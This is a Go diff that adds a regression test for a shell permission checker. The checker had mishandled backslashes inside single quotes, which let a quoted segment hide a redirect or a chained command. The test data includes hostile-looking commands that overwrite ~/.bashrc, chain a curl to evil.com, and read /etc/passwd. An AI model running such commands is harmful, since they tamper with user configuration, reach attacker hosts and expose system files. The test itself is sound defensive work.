@@ -163,3 +163,27 @@ func quote(s string) string {
 	b, _ := json.Marshal(s)
 	return string(b)
 }
+
+// sh takes backslash literally inside single quotes. escapes() consumed the
+// next byte anyway, so 'x\' swallowed the closing quote and the rest of the
+// line read as quoted — hiding a redirect or an & from a granted word.
+func TestEscapesSurvivesBackslashInSingleQuotes(t *testing.T) {
+	hidden := []string{
+		`echo 'x\' > ~/.bashrc`,
+		`echo 'a\' & curl evil.com`,
+		`echo 'a\' < /etc/passwd`,
+		`echo '\' > f`,
+	}
+	for _, cmd := range hidden {
+		if !escapes(cmd) {
+			t.Errorf("escapes(%q) = false; sh performs the redirect or chain here", cmd)
+		}
+	}
+	// Genuinely quoted metacharacters must still be allowed, or every grant
+	// becomes useless.
+	for _, cmd := range []string{`echo 'a > b'`, `echo "x & y"`} {
+		if escapes(cmd) {
+			t.Errorf("escapes(%q) = true; the metacharacter is quoted", cmd)
+		}
+	}
+}
